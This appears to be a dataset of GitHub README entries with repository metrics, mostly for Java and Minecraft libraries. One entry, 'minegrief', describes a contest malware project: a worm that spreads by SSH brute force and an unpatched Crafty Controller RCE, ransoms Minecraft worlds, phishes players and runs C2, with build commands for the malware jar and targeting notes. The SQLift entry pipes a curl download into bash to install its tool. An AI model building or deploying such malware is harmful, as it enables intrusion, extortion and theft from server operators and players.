MultiMC (or another launcher probably). For immediate help, try the [Fabric Discord server](https://discord.gg/v6v4pMv). 
Ping`@skycatminepokie` if the tool is broken. If it's just your Minecraft, ask in the #player-support channel.
## Building from source
1. Clone the repo
2. Run `.\gradlew shadowJar`
3. Built product is `build/libs/BinarySearchTool-(version)-all.jar`",9,6,3,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Pedro-Pathing/PedroPathing,main,"# Welcome to the Official Pedro Pathing Library Repository 

Follow the steps on our [website](https://pedropathing.com/) to setup your project and tune!

---

### Feel Free to reach out on the [Offical Pedro Pathing Discord Server](https://discord.gg/2GfC4qBP5s)!


[![Latest Pedro Version](https://img.shields.io/badge/dynamic/xml?url=https%3A%2F%2Fpedro-pathing.github.io%2Fmaven.pedropathing.com%2Fcom%2Fpedropathing%2Fpedro%2Fmaven-metadata.xml&query=%2Fmetadata%2Fversioning%2Flatest&style=for-the-badge&label=Build&labelColor=111111&color=7b39ab)](https://github.com/Pedro-Pathing/)
<!--
---

# Release History

## v1.0.3

Library: https://github.com/Pedro-Pathing/PedroPathing/releases/tag/v1.0.3
Quickstart: https://github.com/Pedro-Pathing/Quickstart/releases/tag/v1.0.3

- Fixed a  bug that caused follower constants to be updated by user input AFTER follower was already created, causing hardwareMap issues.
- Removed 2 Parameters from Follower and PoseUpdater (two classes), now you have to call `Constants.setConstants(FConstants.class, LConstants.class);` before initalizing the Follower.
- Added Power Caching

----------

## v1.0.2

Library: https://github.com/Pedro-Pathing/PedroPathing/releases/tag/v1.0.2
Quickstart: https://github.com/Pedro-Pathing/Quickstart/releases/tag/v1.0.2

- Fixed a bug that causes the left motors to always be reversed 
- Fixed a bug that would cause driveLeftVector to be always the default value
- Added a debug method to ConstantsUser.java
- Fixed the spelling of `FollowerConstants.useBreakModeInTeleOp` to `FollowerConstants.useBrakeModeInTeleOp`

----------

## v1.0.1

Library: https://github.com/Pedro-Pathing/PedroPathing/releases/tag/v1.0.1
Quickstart: https://github.com/Pedro-Pathing/Quickstart/releases/tag/v1.0.1

Add `FollowerConstants.useBreakModeInTeleOp` - It allows you to use brake mode for your drivetrain motors instead of float during teleop.

----------

## v1.0.0

Library: https://github.com/Pedro-Pathing/PedroPathing/releases/tag/v1.0.0
Quickstart: https://github.com/Pedro-Pathing/Quickstart/releases/tag/v1.0.0


The first release of Pedro Pathing in its library form.

Follow the instructions on the [website ](https://pedropathing.com/) to setup your project.

The Official Quickstart: https://github.com/Pedro-Pathing/Quickstart/

----------


",8,0,2,BSD-3-Clause,1,11.0,0.0,1.0,1.0,10.0,0.0,-2.15,0.0
Revxrsal/Zapper,main,"# Zapper

[![Discord](https://discord.com/api/guilds/939962855476846614/widget.png)](https://discord.gg/pEGGF785zp)
[![Maven Central](https://img.shields.io/maven-metadata/v/https/repo1.maven.org/maven2/io/github/revxrsal/zapper.api/maven-metadata.xml.svg?label=maven%20central&colorB=brightgreen)](https://search.maven.org/artifact/io.github.revxrsal/zapper.api)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Build](https://github.com/Revxrsal/Zapper/actions/workflows/build.yml/badge.svg)](https://github.com/Revxrsal/Zapper/actions/workflows/build.yml)
[![CodeFactor](https://www.codefactor.io/repository/github/revxrsal/zapper/badge)](https://www.codefactor.io/repository/github/revxrsal/zapper)

Zapper is a powerful runtime dependency downloader for Bukkit that aims to abstract away all difficulties that arise
with such task.

## Features

- üó∫Ô∏è **Relocation**: Relocate dependencies to avoid conflicts with other plugins or Bukkit's own dependencies
- üöå **Transitive dependencies**: Dependencies of dependencies will also be downloaded to ensure no classes are missing
  at runtime
- üî• **Does not require `org.bukkit.plugin.Plugin` instances**: This is a very significant convenience of Zapper, as it
  allows you to:
    - Not have to worry about loading dependencies before or after your plugin loads.
    - Your main class can use dependency classes freely (e.g. download Kotlin and your main class would be in Kotlin)
    - Dependencies are loaded before your plugin loads
- üêò Seamless integration with Gradle and ShadowJar
- üçµ Works on all Java versions from 8 to 22

### Examples
- [Bukkit plugin](https://github.com/Revxrsal/Zapper/tree/main/examples/bukkit-java)
- [Bukkit plugin with Kotlin](https://github.com/Revxrsal/Zapper/tree/main/examples/bukkit-kotlin)

## Usage


### With Gradle plugin (recommended)

Zapper provides a Gradle plugin that seamlessly integrates with your build script. To apply it:

build.gradle:

```groovy
plugins {
  id 'com.github.johnrengelman.shadow' version '8.1.1'
  id 'io.github.revxrsal.zapper' version '1.0.3'
}
```

build.gradle.kts:

```groovy
plugins {
  id(""com.github.johnrengelman.shadow"") version ""8.1.1""
  id(""io.github.revxrsal.zapper"") version ""1.0.3""
}
```

Then, add your dependencies using the `zap` configuration block:

```groovy
dependencies {
  // an example dependency
  zap(""com.squareup.moshi:moshi:1.15.2"")

  // you can use the dependency notation and exclude modules as you
  // would with other configurations
  zap(""com.squareup.moshi"", ""moshi"", ""1.15.2"") {
    exclude(module: ""kotlin"")
  }
  zap(""org.jetbrains.kotlin:kotlin-stdlib-jdk8:2.1.0"")
}
```

You can provide additional configuration using the `zapper` extension:

```kt
zapper {
    // directory to download dependencies in
    libsFolder = ""libraries""

    // the prefix for relocating libraries
    relocationPrefix = ""myplugin.libs""
  
    // repositories to fetch dependencies from
    // 
    // by default: includes maven central
    repositories {

        // example repository
        maven(""https://jitpack.io/"")

        // optional: use all repositories declared in this
        // file if you don't want to re-include everything here
        includeProjectRepositories()
    }
  
    // relocate libraries here
    // com.squareup.moshi --> myplugin.libs.moshi
    relocate(""com.squareup.moshi"", ""moshi"")
}
```

Then, in your plugin, extend `ZapperJavaPlugin` instead of `JavaPlugin`:

```java
public final class MyPlugin extends ZapperJavaPlugin {

    // use your dependencies here! don't think twice :D
    private final Moshi moshi;

}
```

Finally, build with `shadowJar`:
```shell
./gradlew shadowJar
```

### With Maven

Sadly, Maven usage is not as seamless as the Gradle one. However, you can use the API
provided by Zapper to download dependencies at runtime:

To add the Zapper API:

```xml
<dependency>
    <groupId>io.github.revxrsal</groupId>
    <artifactId>zapper.api</artifactId>
    <version>1.0.3</version>
    <scope>compile</scope>
</dependency>
```

See [Zapper dependency API usage](#dependency-api-usage)

## Dependency API usage

1. Create a **base** class that declares your dependencies. Don't include your actual plugin logic here. Your main plugin class should extend this base class.

```java
public abstract class MyPluginBase extends JavaPlugin { 

    static {
        File libraries = new File(
                ClassLoaderReader.getDataFolder(MyPluginBase.class),
                ""libraries"" // libraries folder
        );
        if (!libraries.exists()) {
            PluginDescriptionFile pdf = ClassLoaderReader.getDescription(ZapperJavaPlugin.class);
            Bukkit.getLogger().info(""["" + pdf.getName() + ""] It appears you're running "" + pdf.getName() + "" for the first time."");
            Bukkit.getLogger().info(""["" + pdf.getName() + ""] Please give me a few seconds to install dependencies. This is a one-time process."");
        }
        DependencyManager dependencyManager = new DependencyManager(
                libraries,
                URLClassLoaderWrapper.wrap((URLClassLoader) MyPluginBase.class.getClassLoader())
        );

        // add your repositories
        dependencyManager.repository(Repository.mavenCentral());
        dependencyManager.repository(Repository.maven(""https://jitpack.io""));

        // add your dependencies
        dependencyManager.dependency(""com.squareup.moshi:moshi:1.15.2"");

        // IMPORTANT NOTE: Beware that this path may get relocated/changed
        // by your build tool!!! Escape it using runtime tricks if necessary
        dependencyManager.relocate(new Relocation(
                ""com{}squareup{}moshi"".replace(""{}"", "".""),
                ""myplugin.moshi""
        ));

        dependencyManager.load();
    }
}
```

2. Create your actual main class and extend the base class you have just defined:

```java
public final class MyPlugin extends MyPluginBase {
    // your use dependencies here as you like
}
```

### Extending custom JavaPlugin classes
If you, for some reason, would like to extend a different class than a JavaPlugin, and are using the Gradle plugin, you can avoid extending the ZapperJavaPlugin class by doing the following:
1. Declare a **base** class that extends the custom JavaPlugin class:
```java
public abstract class MyPluginBase extends CustomJavaPlugin {
    
}
```

2. Add the following static block to `MyPluginBase`:
```java
    static {
        RuntimeLibPluginConfiguration config = RuntimeLibPluginConfiguration.parse();
        File libraries = new File(ClassLoaderReader.getDataFolder(MyPluginBase.class), config.getLibsFolder());
        if (!libraries.exists()) {
            PluginDescriptionFile pdf = ClassLoaderReader.getDescription(MyPluginBase.class);
            Bukkit.getLogger().info(""["" + pdf.getName() + ""] It appears you're running "" + pdf.getName() + "" for the first time."");
            Bukkit.getLogger().info(""["" + pdf.getName() + ""] Please give me a few seconds to install dependencies. This is a one-time process."");
        }
        DependencyManager dependencyManager = new DependencyManager(
                libraries,
                URLClassLoaderWrapper.wrap((URLClassLoader) MyPluginBase.class.getClassLoader())
        );
        config.getDependencies().forEach(dependencyManager::dependency);
        config.getRepositories().forEach(dependencyManager::repository);
        config.getRelocations().forEach(dependencyManager::relocate);
        dependencyManager.load();
    }
```
3. Extend `MyPluginBase`
```java
public final class MyPlugin extends MyPluginBase {
    // use your dependencies here as you like!
}
```

## Sponsors

If Zapper has made your life significantly easier or you're feeling particularly generous, consider sponsoring the
project! It's a great way to support the many hours I've spent maintaining this library and keeps me motivated. Please
don't sponsor if you can't afford it.

[Donate with PayPal](https://www.paypal.me/Recxrsion)

Huge thanks to those who donated! üòÑ
",4,0,1,,2,2.0,1.0,2.0,1.0,8.0,0.0,-2.2,0.0
cattyngmd/CatFormat,main,"<div align=""center"">
<h1>Cat Format</h1> 
<p> Simple and easy-to-use text formatting tool for Java (primarily made for Minecraft) </p>

![CatFormatIcon](images/icon.png)
</div>

## Why?

I got tired of using Minecraft's `Text` objects like huge builders (e.g `Text.literal(""Hello "" + Formatting.RED + "" world!"")`). And if you need to concatenate multiple `Text` objects, it becomes even worse. That's why I've created this library to help people write these kinds of literals easily and without any boilerplate code. Also, it doesn't support things like `ClickEvent` or `HoverEvent`, and I'm not planning on adding them in the future. But if you want, you can make a pull request!

## Basic syntax

There are a few placeholders that you need to know about:

- `{}`  - Resets the current color and style to the default one.
- `${}` - Sets the text color to the given variable color (e.g `${red}`, `${cyan}`, check [Minecraft Color Codes](https://minecraft.tools/en/color-code.php)).
- `@{}` - Alternative for `${}`. Use this one if you're on Kotlin.
- `#{}` - Sets the text color to the given hex value (e.g `#{fff}`, `#{ff00ff}`).
- `+obius` modifiers - Sets the modifier of the text. You can also combine modifiers,
e.g `${+bi}` - ***bold + italic***.
  - o - [obfuscated text](images/obfuscated.gif) 
  - b - **bold text** 
  - i - *italic text*
  - u - <ins> underline text </ins>
  - s - ~~strikethrough text~~

## Installing

You can install this library using Jitpack.io

Add jitpack repository to your `build.gradle`:
```gradle
maven { url ""https://jitpack.io""  }
```

And then add CatFormat as a dependency:
```gradle
implementation(""com.github.cattyngmd.catformat:catformat-core:1.2.0"")
```
Or if you use fabric
```gradle
modImplementation(""com.github.cattyngmd.catformat:catformat-fabric:1.2.0"")
```

## Example

Simple usage with Minecraft's built-in `MutableText`:

```java
import dev.cattyn.catformat.fabric.FabricCatFormat;

import java.awt.Color;
import java.util.Random;

public static final FabricCatFormat formatter = // you can create only one static instance
        new FabricCatFormat().addVanilla();     // of the Formatter and use it everywhere!

void func() {
  formatter.format(""${red} Hello world!""); // red colored 'Hello world!'
  formatter.format(""#{f0f} Hello world!""); // magenta colored 'Hello world!'
  formatter.format(""#{0000ff} Hello world!""); // blue colored 'Hello world!'
  formatter.format(""${red+b} Hello {} world!""); // red colored 'Hello' with bold style and ' world!' without any style

  // It also supports Java's default formatting tool - String.format()
  formatter.format(""${red} Hello %s!"", ""world""); // red colored 'Hello world!'

  // You can create your own color namespaces too!
  formatter.add(""light_green"", 0x99FF99);
  formatter.add(""pink"", Color.PINK.hashCode());
  formatter.add(""random_color"", () -> new Random().nextInt(0xFFFFFF));

  formatter.format(""${light_green} Hello ${random_color} world ${pink}!"");
}
```

Also, you can use classes with colors and use them in your CatFormat string:

```java
import dev.cattyn.catformat.stylist.annotations.*;
import java.awt.*;

class Styles {
    // Mark your color with final keyword if you are not
    // going to change it, because it parses a bit faster
    @Style 
    final int black = Color.BLACK.hashCode();
  
    // You can also use `value` property in @Style
    // to set custom name to the color
    @Style(""custom_name"")
    final int red = Color.RED.hashCode();
    
    @Style(""dynamic_color"")
    int dynamic = Color.CYAN.hashCode();
    
    // And of course functions :p
    @Style(""random"")
    int getRandomColor() { // Beware, you cant pass any params
        return new Random().nextInt(0xFFFFFF);
    }
}
```

To use it in a Minecraft plugin or any other project you can make your own `TextWrapper`. For example
```java
import dev.cattyn.catformat.CatWrapper;
import dev.cattyn.catformat.text.TextWrapper;

class StringWrapper implements TextWrapper<String> { // idk why but you can do that
    String colored(String text, int color) {
        return text; // NOP
    }
    
    String concat(String text, String text2) {
        return text + text2;
    }
    
    String modify(String text, Modifiers modifiers) {
        return text;
    }
    
    String newText(String text) {
        return text;
    }
}

void func() {
    CatFormat format = new CatFormat(new StringWrapper());
}


```
",6,2,2,MIT,1,1.0,0.0,1.0,1.0,4.0,0.0,-0.65,4.0
chebuya/minegrief,main,"<h1 align=""center"">
<b>Minegrief</b>
</h1>

<h1 align=""center"">
  Submission for vxunderground JVM malware contest
    <img src=""https://github.com/user-attachments/assets/b83ae4d1-36ab-4b60-9b2d-c132ca7d9419"" alt=""minegrief"" width=""500px"" height=auto>

  https://github.com/blackmassgroup/minegrief

  <img src=""https://github.com/user-attachments/assets/251374d0-b0d6-4808-91d7-9400f692101e"" alt=""minegrief"" width=""500px"" height=auto>
  <br>
</h1>

<p align=""center"">
<a href=""https://x.com/_chebuya""><img src=""https://img.shields.io/twitter/follow/_chebuya.svg?logo=twitter""></a>
<a href=""https://img.shields.io/github/stars/chebuya/minegrief""><img src=""https://img.shields.io/github/stars/chebuya/minegrief""></a>
<a href=""https://img.shields.io/badge/Java-000000?logo=OpenJDK""><img src=""https://img.shields.io/badge/Java-000000?logo=OpenJDK""></a>
<a href=""https://opensource.org/license/MIT""><img src=""https://img.shields.io/badge/license-MIT-blue""></a>
</p>

<p align=""center"">
  <a href=""#features"">Features</a> ‚Ä¢
  <a href=""#notes"">Notes</a> ‚Ä¢
  <a href=""#targeting"">Targeting</a>
</p>

# Features
Self-spreading to other Minecraft servers using an extendable, module-based lateral movement system.
  - Crafty Controller Auth'd RCE - undisclosed, unpatched, intentional(?) Auth'd RCE in Crafty Controller, a panel for Minecraft server management (https://craftycontrol.com/). Check for default creds of admin:crafty or brute force.
  - SSH brute forcing - Classic SSH brute forcing, Minegrief will copy itself over SCP and execute itself if a login is successful

Persistence/stealth by ""infecting"" the Minecraft server jar file via manifest entry point modification (https://docs.oracle.com/javase/tutorial/deployment/jar/manifestindex.html)

Encrypt Minecraft worlds and demand a Minecoin ransom.
<video src=""https://github.com/user-attachments/assets/2db17e66-bf90-494a-bf67-0815976330ec"" autoplay muted loop playsinline style=""max-width: 100%;""></video>

Phish connecting Minecraft players.

<video src=""https://github.com/user-attachments/assets/67b052fb-45ac-42bb-96d5-a57c177bd353"" autoplay muted loop playsinline style=""max-width: 100%;""></video>


Centralized command and control for system-level control of infected servers.
<video src=""https://github.com/user-attachments/assets/428ca357-8954-4efa-aafd-4754bc640040"" autoplay muted loop playsinline style=""max-width: 100%;""></video>


Extendable transport system, allowing for the creation of customized C2 channels.

Works on Java 8 and above.


# Notes
Lateral movement modules require minegriefagent to be built as a jar file, as modules will copy itself over in a jar to spread.

## To build the agent jarfile
Download jsch to the root directory of the repository
```bash
wget https://repo1.maven.org/maven2/com/github/mwiede/jsch/0.2.17/jsch-0.2.17.jar
unzip jsch-0.2.17.jar
```

Run this from the root of the repository
```bash
rm -rf build-manual
mkdir build-manual
find agent -name '*.java' > sources.txt
<JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
cp -r com/jcraft build-manual/com
echo 'Manifest-Version: 1.0\nMain-Class: net.minecraft.bundler.Backdoor\nBundler-Format: 1.0' > manifest.txt
<JAVA 1.8 DIR>/bin/jar cvfm malware.jar manifest.txt -C build-manual .
```

Run it
```bash
<JAVA 1.8 DIR>/bin/java -jar malware.jar
```

## To build the server jarfile
Run this from the root of the repository
```bash
rm -rf build-manual
mkdir build-manual
find server -name '*.java' > sources.txt
<JAVA 1.8 DIR>/bin/javac -d build-manual @sources.txt
echo 'Manifest-Version: 1.0\nMain-Class: com.chebuya.minegriefserver.Main\nBundler-Format: 1.0' > manifest.txt
<JAVA 1.8 DIR>/bin/jar cvfm c2-server.jar manifest.txt -C build-manual .
```

Run it
```bash
<JAVA 1.8 DIR>/bin/java -jar c2-server.jar
```


# Targeting
Minecraft servers will always have Java installed so we don't have to worry about installing it ourselves.

Infected servers will receive CIDR blocks to scan from the C2. Certain ASNs have a higher frequency of Minecraft servers (ex: Digital Ocean ASNs).  I have scraped shodan/censys to find these ASNs, the data is [here](top-asn.csv)


--------

<div align=""center"">
  
`minegrief` is made with üñ§ by [@_chebuya](https://x.com/_chebuya) and distributed under the [MIT license](LICENSE.md).

</div>
",0,1,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
yegor256/together,master,"# Runs Java Lambda in Many Threads

[![EO principles respected here](https://www.elegantobjects.org/badge.svg)](https://www.elegantobjects.org)
[![DevOps By Rultor.com](http://www.rultor.com/b/yegor256/together)](http://www.rultor.com/p/yegor256/together)
[![We recommend IntelliJ IDEA](https://www.elegantobjects.org/intellij-idea.svg)](https://www.jetbrains.com/idea/)

[![mvn](https://github.com/yegor256/together/actions/workflows/mvn.yml/badge.svg)](https://github.com/yegor256/together/actions/workflows/mvn.yml)
[![PDD status](http://www.0pdd.com/svg?name=yegor256/together)](http://www.0pdd.com/p?name=yegor256/together)
[![Maven Central](https://img.shields.io/maven-central/v/com.yegor256/together.svg)](https://maven-badges.herokuapp.com/maven-central/com.yegor256/together)
[![Javadoc](http://www.javadoc.io/badge/com.yegor256/together.svg)](http://www.javadoc.io/doc/com.yegor256/together)
[![codecov](https://codecov.io/gh/yegor256/together/branch/master/graph/badge.svg)](https://codecov.io/gh/yegor256/together)
[![Hits-of-Code](https://hitsofcode.com/github/yegor256/together)](https://hitsofcode.com/view/github/yegor256/together)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](https://github.com/yegor256/together/blob/master/LICENSE.txt)

With this small Java library you can test your objects
for [thread safety] by doing some manipulations with them
in multiple parallel threads. You may read this blog post,
in order to understand the motivation for this type of
testing better: [How I Test My Java Classes for Thread-Safety][blog].

By the way, there are similar libraries for Java, but they are
either more complex or less tests-oriented, for example
[lincheck],
[ConcurrentUnit](https://github.com/jhalterman/concurrentunit),
[`RunsInThreads`][RunsInThreads] from [cactoos-matchers],
or
[`Threads`][Threads] from [Cactoos](https://github.com/yegor256/cactoos).

First, you add this library to your `pom.xml` in [Maven]:

```xml
<dependency>
  <groupId>com.yegor256</groupId>
  <artifactId>together</artifactId>
  <version>0.1.0</version>
</dependency>
```

Then, you use it like this, in your [JUnit5] test
(with [Hamcrest]):

```java
import org.hamcrest.MatcherAssert;
import org.hamcrest.Matchers;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import com.yegor256.Together;

class FooTest {
  @Test
  void worksAsExpected() {
    MatcherAssert.assertThat(
      ""processes all lambdas successfully"",
      new Together<>(
        thread -> {
          // Do the job and use ""thread"" as a number
          // of the thread currently running (they are all unique).
          return true;
        }
      ),
      Matchers.not(Matchers.hasItem(Matchers.is(false)))
    );
  }
}
```

Here, the `Together` class will run the ""job"" in multiple threads
and will make sure that all of them return `true`. If at least
one of them returns `false`, the test will fail. If at least one of the
threads will throw an exception, the test will also fail.

`Together` guarantees that all threads will start exactly simultaneously,
thus simulating [race condition] as much as it's possible. This is exactly
what you need for your tests: making sure your object under test
experiences troubles that are very similar to what it might experience
in real life.

For even better/stronger testing, you can use
[`@RepeatedTest`][RepeatedTest].

## How to Contribute

Fork repository, make changes, send us a
[pull request](https://www.yegor256.com/2014/04/15/github-guidelines.html).
We will review your changes and apply them to the `master` branch shortly,
provided they don't violate our quality standards. To avoid frustration,
before sending us your pull request please run full Maven build:

```bash
mvn clean install -Pqulice
```

You will need [Maven] 3.3+ and Java 11+.

[blog]: https://www.yegor256.com/2018/03/27/how-to-test-thread-safety.html
[JUnit5]: https://junit.org/junit5/
[Hamcrest]: http://hamcrest.org
[Maven]: https://maven.apache.org
[race condition]: https://en.wikipedia.org/wiki/Race_condition
[thread safety]: https://en.wikipedia.org/wiki/Thread_safety
[RunsInThreads]: https://github.com/llorllale/cactoos-matchers/blob/master/src/main/java/org/llorllale/cactoos/matchers/RunsInThreads.java
[cactoos-matchers]: https://github.com/llorllale/cactoos-matchers
[Threads]: https://github.com/yegor256/cactoos/blob/master/src/main/java/org/cactoos/experimental/Threads.java
[lincheck]: https://github.com/JetBrains/lincheck
[RepeatedTest]: https://junit.org/junit5/docs/5.0.1/api/org/junit/jupiter/api/RepeatedTest.html
",6,1,1,MIT,8,5.0,1.0,8.0,3.0,24.0,0.0,-9.7,6.0
andressep95/SQLift,main,"# SQLift

## Official Page

[![Version](https://img.shields.io/badge/version-1.0.0-blue)](https://github.com/andressep95/sqlift-install)
[![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/andressep95/sqlift-install/blob/main/LICENSE)

[SQLift](https://andressep95.github.io/sqlift-install) - Don‚Äôt forget to leave your ‚≠ê and report issues!

## Introduction

SQLift is a tool that simplifies mapping SQL queries to Java objects. You can install and use it in two ways: through a
native installer or by using Docker.

## Supported Architectures

### Native Executables

| Operating System | Architecture | Status  |
|------------------|--------------|---------|
| macOS            | ARM64        | ‚úÖ       |
| macOS            | AMD64        | ‚úÖ       |
| Linux            | AMD64        | ‚úÖ       |
| Windows          | Any          | ‚ö†Ô∏è Only via Docker |

## Installation Methods

### 1. Native Installer

This method installs SQLift directly on your system, providing a simpler usage of commands.

#### Requirements

- macOS (Apple Silicon or Intel) or Linux
- Access to terminal with installation permissions

#### Installation Steps

**For macOS:**

```bash
curl -fsSL https://raw.githubusercontent.com/andressep95/sqlift-install/main/macos-install.sh | bash
```

**For Linux:**

```bash
curl -fsSL https://raw.githubusercontent.com/andressep95/sqlift-install/main/linux-install.sh | bash
```

The installer:

- Downloads the binary for your system
- Installs it in ~/.sqlift
- Adds it to your PATH

#### Verification

```bash
sqlift --version
```

#### Basic Commands

```bash
sqlift init        # Initialize the configuration
sqlift generate    # Generate the entities
```

### 2. Using Docker

This method requires Docker to be installed, but offers greater portability.

#### Requirements

- Docker installed and running
- Permissions to run Docker commands
---

### **Installation and Usage Steps**

#### **1. Download the image**

```bash
docker pull ghcr.io/andressep95/sqlift-cli:latest
```

---

### **Linux/macOS**

#### **Initialize configuration**

```bash
docker run --rm -v $(pwd):/workspace ghcr.io/andressep95/sqlift-cli:latest init /workspace
```

#### **Generate entities**

```bash
docker run --rm -v $(pwd):/workspace ghcr.io/andressep95/sqlift-cli:latest generate /workspace
```

#### **Interactive mode**

```bash
docker run -it -v $(pwd):/workspace ghcr.io/andressep95/sqlift-cli:latest
```

---

### **Windows (PowerShell)**

#### **Initialize configuration**

```bash
docker run --rm -v ${PWD}:/workspace ghcr.io/andressep95/sqlift-cli:latest init /workspace
```

#### **Generate entities**

```bash
docker run --rm -v ${PWD}:/workspace ghcr.io/andressep95/sqlift-cli:latest generate /workspace
```

#### **Interactive mode**

```bash
docker run -it -v ${PWD}:/workspace ghcr.io/andressep95/sqlift-cli:latest
``` 

## Configuration (Common for both methods)

After installation, you need to configure SQLift using the sqlift.yml file:

```yaml
version: ""1.0""
sql:
  engine: ""postgres""  # Database engine
  schema: ""schema.sql""  # Path to the SQL schema file
  output:
    package: ""cl.playground.projectname.target""  # Base package for the entities
    lombok: true  # Enable/disable Lombok annotations
```

## Required Schema Structure

```sql
CREATE TABLE sucursales (
    id BIGINT PRIMARY KEY,
    nombre VARCHAR(100) NOT NULL,
    direccion VARCHAR(200) NOT NULL,
    telefono VARCHAR(20),
    email VARCHAR(100),
    activo BOOLEAN DEFAULT TRUE
);

CREATE TABLE stock_sucursales (
    id BIGINT PRIMARY KEY,
    cantidad INT NOT NULL,
    sucursal_id BIGINT,
    FOREIGN KEY (sucursal_id) REFERENCES sucursales(id)
);

CREATE TABLE movimientos (
    id BIGINT PRIMARY KEY,
    tipo_movimiento VARCHAR(50) NOT NULL,
    sucursal_origen_id BIGINT,
    sucursal_destino_id BIGINT,
    FOREIGN KEY (sucursal_origen_id) REFERENCES sucursales(id),
    FOREIGN KEY (sucursal_destino_id) REFERENCES sucursales(id)
);

``` 
",1,3,4,,1,7.0,0.0,4.0,2.0,6.0,1.0,-2.1,10.0
Argon4W/AcceleratedRendering,main,"
Installation information
=======

This template repository can be directly cloned to get you started with a new
mod. Simply create a new repository cloned from this one, by following the
instructions at [github](https://docs.github.com/en/repositories/creating-and-managing-repositories/creating-a-repository-from-a-template).

Once you have your clone, simply open the repository in the IDE of your choice. The usual recommendation for an IDE is either IntelliJ IDEA or Eclipse.

> **Note**: For Eclipse, use tasks in `Launch Group` instead of ones founds in `Java Application`. A preparation task must run before launching the game. NeoGradle uses launch groups to do these subsequently.

If at any point you are missing libraries in your IDE, or you've run into problems you can
run `gradlew --refresh-dependencies` to refresh the local cache. `gradlew clean` to reset everything 
{this does not affect your code} and then start the process again.

Mapping Names:
============
By default, the MDK is configured to use the official mapping names from Mojang for methods and fields 
in the Minecraft codebase. These names are covered by a specific license. All modders should be aware of this
license. For the latest license text, refer to the mapping file itself, or the reference copy here:
https://github.com/NeoForged/NeoForm/blob/main/Mojang.md

Additional Resources: 
==========
Community Documentation: https://docs.neoforged.net/  
NeoForged Discord: https://discord.neoforged.net/
",0,1,1,MIT,1,0.0,0.0,1.0,1.0,3.0,0.0,-0.4,0.0
techsenger/stagepro,main,"# Techsenger StagePro
* [Overview](#overview)
* [Demo](#demo)
* [Features](#features)
* [JavaFX Versions](#javafx)
* [Dependencies](#dependencies)
* [Usage](#usage)
* [Code building](#code-building)
* [Running Sampler](#sampler)
* [License](#license)
* [Feedback](#feedback)

# Overview <a name=""overview""></a>

Techsenger StagePro is a library that allows you to create custom stages with nearly any configuration, while remaining
easy to use. The project also includes a sampler module, featuring key samples to help you get started with the library.

# Demo <a name=""demo""></a>

![StagePro Demo](./demo.png)

# Features <a name=""features""></a>

Key features include:

* Fully customizable title bar configurations.
* Support for dynamic configuration changes.
* Ability to place basic buttons on either the left or right side.
* Two policies for the maximize button.
* Styling with CSS.
* Dark mode support.
* Size effect (disabled by default).
* Only two events triggered during resizing (start and finish).

Currently, shadow for Stage is not supported, as it seems there is no way to set a shadow around a Stage using JavaFX.
It is likely that this can only be achieved using native code.

# JavaFX Versions <a name=""javafx""></a>

Due to some bugs, use JavaFX versions 16‚Äì20, or a version of JavaFX after 24-ea+19 (see JDK-8344372).

# Dependencies <a name=""dependencies""></a>

The project will be added to the Maven Central repository in a few weeks.

# Usage <a name=""usage""></a>

To create a standard Stage, use the code below. To explore all features, check out the examples in the sampler.

```
@Override
public void start(Stage stage) {
    var controller = new StandardStageController(stage, 800, 600);
    var content = new VBox(...);
    controller.setContent(content);
    stage.show();
}
```

# Code Building <a name=""code-building""></a>

To build the library use standard Git and Maven commands:

    git clone https://github.com/techsenger/stagepro
    cd stagepro
    mvn clean install

# Running Sampler <a name=""sampler""></a>

To run the sampler execute the following commands in the root of the project:

    cd stagepro-sampler
    mvn javafx:run

Please note, that debugger settings are in `stagepro-sampler/pom.xml` file.

# License <a name=""license""></a>

Techsenger StagePro is licensed under the Apache License, Version 2.0.

# Feedback <a name=""feedback""></a>

Any feedback is welcome. Besides, it would be interesting to know for what cases this project is used. It will
help to understand the way the project should go and provide more information in documentation.

",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
KOSASIH/qn-tech,main,"[![Certified by Stanford University](https://img.shields.io/badge/Certified%20by%20Stanford%20University-Cryptocurrency%20and%20Blockchain%20Certificate-lightgreen.svg)](https://online.stanford.edu/courses/sohs-ystanford-cryptocurrency-and-blockchain)
[![Certified by Coursera](https://img.shields.io/badge/Certified%20by%20Coursera-Blockchain%20Specialization%20Certificate-yellow.svg)](https://www.coursera.org/specializations/blockchain)
[![Certified by edX](https://img.shields.io/badge/Certified%20by%20edX-Blockchain%20Fundamentals%20Certificate-orange.svg)](https://www.edx.org/professional-certificate/uc-berkeleyx-blockchain-fundamentals)
[![Certified by Pi Network](https://img.shields.io/badge/Certified%20by%20Pi%20Network-Pi%20Blockchain%20Developer%20Certificate-blue.svg)](https://minepi.com/)
[![Certified by ISACA](https://img.shields.io/badge/Certified%20by%20ISACA-Cybersecurity%20Fundamentals%20Certificate-red.svg)](https://www.isaca.org/credentialing/cybersecurity-fundamentals-certificate)
[![Certified by MIT](https://img.shields.io/badge/Certified%20by%20MIT-Blockchain%20and%20Bitcoin%20Technologies%20Certificate-blueviolet.svg)](https://www.edx.org/professional-certificate/mitx-blockchain-and-bitcoin-technologies)
[![Certified by University of Nicosia](https://img.shields.io/badge/Certified%20by%20University%20of%20Nicosia-Master%20in%20Digital%20Currency%20Certificate-orange.svg)](https://www.unic.ac.cy/blockchain/)
[![Certified by Blockchain Council](https://img.shields.io/badge/Certified%20by%20Blockchain%20Council-Certified%20Blockchain%20Expert%20Certificate-lightblue.svg)](https://www.blockchain-council.org/certifications/certified-blockchain-expert/)
[![Certified by BadgeCert](https://img.shields.io/badge/Certified%20by%20BadgeCert-Digital%20Credential%20Certificate-purple.svg)](https://www.badgecert.org/)
[![Certified by BCdiploma](https://img.shields.io/badge/Certified%20by%20BCdiploma-Blockchain%20Diploma%20Certificate-green.svg)](https://bcdiploma.com/)
[![Certified by University of Oxford](https://img.shields.io/badge/Certified%20by%20University%20of%20Oxford-Blockchain%20Strategy%20Certificate-lightcoral.svg)](https://www.oxfordonlinecourses.com/courses/blockchain-strategy)
